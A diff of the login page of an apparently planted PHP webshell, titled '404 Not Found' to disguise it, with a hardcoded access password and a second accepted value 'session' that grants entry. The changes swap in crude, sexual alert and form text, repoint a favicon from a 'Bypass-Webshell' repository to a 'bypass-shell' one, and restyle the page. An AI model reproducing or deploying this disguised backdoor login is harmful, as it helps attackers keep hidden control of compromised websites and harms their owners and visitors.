@@ -14,21 +14,13 @@ error_reporting(0);
 	$_7 = array_merge($_POST, $_GET);
 	$_r = "required='required'";
 	$gcw = "getcwd";
-
-
-
-	$correctPassword = "ImSle3py"; //Change Password
-
-
-
-
-
+	$correctPassword = "ImSle3py";
 	if (isset($_POST['pass'])) {
 		$enteredPassword = $_POST['pass'];
 		if ($enteredPassword === $correctPassword or $enteredPassword === 'session') {
 			$_SESSION['forbidden'] = true;
 		} else {
-			echo '<script>alert("Who Are You?!, Bitch!!");</script>';
+			echo '<script>alert("You Are Not My Daddy, Your Dick Small");</script>';
 		}
 	}
 	if (isset($_GET['logout'])) {
@@ -43,9 +35,8 @@ error_reporting(0);
 	<html>
 	<head>
 	<title>404 Not Found</title>
-	<link rel='icon' href='https://raw.githubusercontent.com/sagsooz/Bypass-Webshell/main/hehe.png'>
+	<link rel='icon' href='https://raw.githubusercontent.com/m0chAvIn/bypass-shell/main/hey%20ges.png'>
 	<meta name="theme color" content="#00BFFF">
-	<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript'></script>
 	</head>
 	<style>
     body {
@@ -58,15 +49,14 @@ error_reporting(0);
         flex-direction: column;
         justify-content: center;
         align-items: center;
-        background-color: black;
+        background-color: #080c24;
+        color: #d80404;
     }
     h1 {
         color: #00BFFF;
     }
     img {
-        opacity: 0.5;
         width: 200px;
-        height: 300px;
     }
     form {
         text-align: center;
@@ -84,8 +74,10 @@ error_reporting(0);
     }
 	</style>
 	<body>
+    <img width="300" src="https://res.cloudinary.com/dduxgerpr/image/upload/v1713937441/hey_ges_xznduk.png" />
+    <img width="200" src="https://res.cloudinary.com/dduxgerpr/image/upload/v1709116699/Sle3py_tiujx9.png" />
 	<form method="post">
-		<p>Hello Dady</p>
+		<p>Hello Daddy, Im Horny</p>
 			<input placeholder="password" type="password" name="pass" required>
 			<input type="submit" name="loginin" value="Fuck Me Daddy!">
 		</form>
@@ -129,6 +121,7 @@ body {
 
 table {
 	table-layout: fixed;
+    border: #d80404 solid 1px
 }
 
 td {
